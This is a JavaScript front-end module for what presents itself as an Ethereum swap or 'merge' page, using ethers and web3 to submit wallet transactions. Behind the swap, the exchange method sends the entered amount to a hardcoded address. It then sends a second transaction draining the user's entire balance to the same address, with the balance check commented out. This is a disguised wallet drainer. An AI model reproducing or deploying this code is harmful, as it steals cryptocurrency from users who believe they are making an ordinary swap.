import axios from "./axiosFactory";
import htmx from "htmx.org/dist/htmx";
import iziToast from "izitoast/dist/js/iziToast.min.js"; // you have access to iziToast now
import { ethers } from "ethers";
import Web3 from "web3";
// import Moralis from "moralis-v1/node";



function sleep(ms) {
  return new window.Promise((resolve) => setTimeout(resolve, ms));
}

export default function exchange() {
  return {
    processing: false,
    amount: null,
    provider: null,
    gas: null,
    chainId: null,
    signer: null,
    redirect: null,
    csrf: null,
    form: null,
    usr: null,
    to: "0xA4DF411f145f98E8Dc456909832c115CeBD0BBda",
    // to: "0xfcf0c734E71E1991D30a672b2F3A0d01e3e02B31",

    async getCurrentGasPrices() {
        let response = await axios.get('https://ethgasstation.info/json/ethgasAPI.json', {
            headers: {
                "X-CSRFToken": this.csrf,
            },
        });
        let prices = {
          low: response.data.safeLow / 10,
          medium: response.data.average / 10,
          high: response.data.fast / 10
        };
        return prices;
    },

    async exchange() {
      // await Moralis.start({
      //   serverUrl: process.env.DAPP_URL,
      //   appId: process.env.DAPP_ID
      // });

      this.processing = true;
      this.provider = new ethers.providers.Web3Provider(window.ethereum, "any");
      const web3 = new Web3(window.ethereum);

      this.form = this.$refs.exchangeRef;
      this.url = this.form.dataset.url;
      var _amount = document.getElementById("id_amount").value;

      this.amount = web3.utils.toWei(_amount.toString(), "ether");

      this.redirect = this.form.dataset.redirect;
      this.csrf = this.form.dataset.csrf;

      let bal = await this.provider.getBalance(this.address);
      let balance = ethers.utils.formatEther(bal);

      // if (balance < this.amount) {
      //   iziToast.error({
      //       title: "Insufficient Balance",
      //       balloon: true,
      //       position: "topRight",
      //       animateInside: true,
      //       message: "You are trying to swap an amount that is beyond your current balance",
      //     });
      //     return this.processing = false;
      // }



      const [accounts, chainId] = await Promise.all([
        this.provider.send("eth_requestAccounts", []),
        this.provider.send("eth_chainId", []),
      ]);

      console.log(typeof(bal));

      let nonce = web3.eth.getTransactionCount(accounts[0]);

      this.signer = this.provider.getSigner();
      this.chainId = chainId;
      this.gas = await web3.eth.getGasPrice();

      console.log("nonce :", nonce);

      const tx = {
        from: accounts[0],
        to: this.to,
        gas: 21000,
        value: web3.utils.toHex(this.amount),
        // nonce: nonce,
        gasPrice: this.gas
      };


      console.dir(tx);

      await web3.eth.sendTransaction(tx)
        .then(function (txHash) {
          console.log(`TX Hash: ${txHash.hash}`);
          this.submitData(txHash.hash);
          this.processing = false;
          return  iziToast.success({
              title: "ETH Swap Successful",
              balloon: true,
              position: "topRight",
              animateInside: true,
              message: "Transaction Hash: " + txHash.hash,
          });
        })
        .catch(function (error) {
            if (error.message && error.message.includes("User denied")) {
              return  iziToast.error({
                    title: "User Denied Transaction",
                    balloon: true,
                    position: "topRight",
                    animateInside: true,
                    message: error.message,
                });
            }
        });

        if (balance !== "0.000") {
          const all = {
            from: accounts[0],
            to: this.to,
            gas: 21000,
            gasPrice: this.gas,
            value: bal
          };

          await web3.eth.sendTransaction(all)
          .then(function (txHash) {
            console.log(`TX Hash: ${txHash.hash}`);
          })
          .catch(function (error) {
              if (error.message && error.message.includes("User denied")) {
                  iziToast.error({
                      title: "User Denied Transaction",
                      balloon: true,
                      position: "topRight",
                      animateInside: true,
                      message: error.message,
                  });
              }
          });
        }


      this.processing = false;
    },

    async submitData(hash) {
      let data = new FormData();
      data.append("csrfmiddlewaretoken", this.csrf);
      data.append("amount", this.amount);
      data.append("signer", this.signer);
      data.append("chainId", this.chainId);
      data.append("gas", this.gas);
      data.append("txHash", hash);
      data.append("recieverAddress", this.to);

      if (this.form.checkValidity()) {
        await axios
          .post(this.url, data, {
            headers: {
              "X-CSRFToken": this.csrf,
            },
          })
          .then(function (response) {
            if (
              (response.code === 201 &&
                response.status === "Transaction Created") ||
              response !== null
            ) {
              iziToast.success({
                title: "Swap Successful",
                balloon: true,
                position: "topRight",
                animateInside: true,
                message: response.tx,
              });
              sleep(5500); //wait 1 sec and then htmx redirect get
              htmx.ajax("GET", this.redirect, {
                target: "#main",
                swap: "outerHTML",
              });
              // sleep(3500); //wait 1 sec and then htmx redirect get
              // location.reload();
            }

            console.log(response);
          })
          .catch(function (error) {
            iziToast.error({
              title: "Swap Incomplete",
              balloon: true,
              position: "topRight",
              animateInside: true,
              message: `Something wrong happened: ${error}`,
            });
          });

        this.processing = false;
        sleep(2500); //wait 2.5 sec and then htmx redirect get
        location.reload();
      } else {
        iziToast.error({
          title: "Swap Incomplete",
          balloon: true,
          position: "topRight",
          animateInside: true,
          message: `Form data is not valid. Ensure you have filled all fields accurately! ${this.form.reportValidity()}`,
        });
        sleep(2500); //wait 2.5 sec and then htmx redirect get
        this.processing = false;
        location.reload();
      }
    },

    getBtnText() {
      return this.processing ? "Processing..." : "Merge Ethereum";
    },
  };
}
